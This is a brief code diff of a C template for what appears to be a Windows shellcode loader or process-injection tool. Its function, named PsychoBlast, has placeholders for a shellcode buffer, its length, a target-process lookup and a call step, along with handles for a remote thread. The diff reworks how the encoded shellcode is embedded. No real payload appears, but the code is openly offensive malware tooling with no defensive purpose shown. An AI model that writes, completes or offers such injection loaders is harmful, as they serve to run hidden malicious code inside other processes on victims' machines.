@@ -27,15 +27,12 @@ DWORD WINAPI PsychoBlast(LPVOID lpParameter)
 	// WARNING: THIS TEMPLATE NEED FIND PROCESS!!
     //####FIND_PROCESS####
 
-    const unsigned char raw[] = ####SHELLCODE####;
-	int length = sizeof(raw);
+    int length = ####SHELLCODE_LENGTH####;
+    unsigned char* encoded = ####SHELLCODE####;
 
-	unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2);
-	memcpy(encoded, raw, length);
+    //####CALL####
 
-	//####CALL####
-
-	unsigned char* decoded = encoded;
+    unsigned char* decoded = encoded;
 
 	HANDLE processHandle;
 	HANDLE remoteThread;
